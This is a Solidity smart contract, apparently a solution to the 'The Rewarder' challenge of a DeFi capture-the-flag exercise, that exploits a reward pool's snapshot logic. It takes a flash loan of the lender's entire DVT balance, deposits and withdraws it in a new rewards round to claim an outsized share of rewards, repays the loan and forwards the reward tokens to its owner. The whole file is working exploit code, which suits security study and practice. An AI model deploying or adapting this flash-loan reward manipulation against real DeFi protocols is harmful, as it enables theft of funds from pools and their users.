// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import {Ownable} from "openzeppelin-contracts/access/Ownable.sol";
import {Address} from "openzeppelin-contracts/utils/Address.sol";
import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";
import "forge-std/console.sol";

interface IFlashLoanerPool {
    function flashLoan(uint256 amount) external;
}

interface ITheRewarderPool {
    function deposit(uint256 amountToDeposit) external;
    function withdraw(uint256 amountToWithdraw) external;

    function lastSnapshotIdForRewards() external view returns (uint256);
    function lastRecordedSnapshotTimestamp() external view returns (uint256);
    function lastRewardTimestamps(address account) external view returns (uint256);
    function liquidityToken() external view returns (address);
    function accToken() external view returns (address);
    function rewardToken() external view returns (address);
    function roundNumber() external view returns (uint256);
    function isNewRewardsRound() external view returns (bool);
}

contract AttackerContract is Ownable {
    using Address for address;

    error notAuthorized();

    IFlashLoanerPool private immutable flashLoanerPool;
    IERC20 private immutable dvtToken;
    ITheRewarderPool private immutable theRewarderPool;

    constructor(address flashLoanPoolAddress, address dvtTokenAddress, address theRewarderPoolAddress) {
        require(
            flashLoanPoolAddress.isContract() && dvtTokenAddress.isContract() && theRewarderPoolAddress.isContract(),
            "Not a contract address"
        );
        flashLoanerPool = IFlashLoanerPool(flashLoanPoolAddress);
        dvtToken = IERC20(dvtTokenAddress);
        theRewarderPool = ITheRewarderPool(theRewarderPoolAddress);
    }

    function attack() external onlyOwner {
        uint256 amount = dvtToken.balanceOf(address(flashLoanerPool));
        flashLoanerPool.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) external {
        if (msg.sender != address(flashLoanerPool)) {
            revert notAuthorized();
        }
        console.log("AttackerContract: Received flash loan of %s DVT tokens", amount / 1e18);
        console.log("New RoundStatus:", theRewarderPool.isNewRewardsRound());
        if (theRewarderPool.isNewRewardsRound()) {
            console.log("AttackerContract: New rewards round detected");
            dvtToken.approve(address(theRewarderPool), amount);
            theRewarderPool.deposit(amount);
            theRewarderPool.withdraw(amount);
            dvtToken.approve(address(flashLoanerPool), amount);
            dvtToken.transfer(address(flashLoanerPool), amount);
            IERC20 rewardToken = IERC20(theRewarderPool.rewardToken());
            uint256 rewardAmount = rewardToken.balanceOf(address(this));
            console.log("AttackerContract: Reward amount %s", rewardAmount / 1e18);
            rewardToken.transfer(owner(), rewardAmount);
        } else {
            dvtToken.approve(address(flashLoanerPool), amount);
            dvtToken.transfer(address(flashLoanerPool), amount);
        }
    }

    receive() external payable {}
}
